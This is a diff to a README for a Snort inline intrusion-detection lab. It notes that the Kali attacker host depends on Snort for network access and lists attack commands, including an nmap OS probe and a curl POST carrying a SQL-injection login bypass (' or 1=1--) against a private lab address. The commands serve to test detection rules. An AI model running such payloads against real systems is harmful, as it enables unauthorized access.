@@ -17,7 +17,7 @@ All Snort rules created for this simulation are within router at /etc/snort/rule
 
 ###########
 #IMPORTANT:
-#External host (kali) will not be able to access the internal network unless the snort command mentioned above is running (since snort is set to work in inline mode here)
+#External host (kali) will not be able to access internet or the internal network unless the snort command mentioned above is running (since snort is set to work in inline mode here, and kali can only communicate with the router directly)
 ###########
 
 To start attack:
@@ -31,5 +31,5 @@ To start attack:
         os-probing:
             nmap 192.168.70.4 -O
         SQL-injection:
-            sqlmap -u "http://192.168.70.4:3000/rest/user/login" --data "email=123@123&&password=12345" --ignore-code=401
+            curl -X POST http://192.168.70.4:3000/rest/user/ -H "Content-Type: application/json" -d '{"email":"'\'' or 1=1--","password":"kali"}'
 
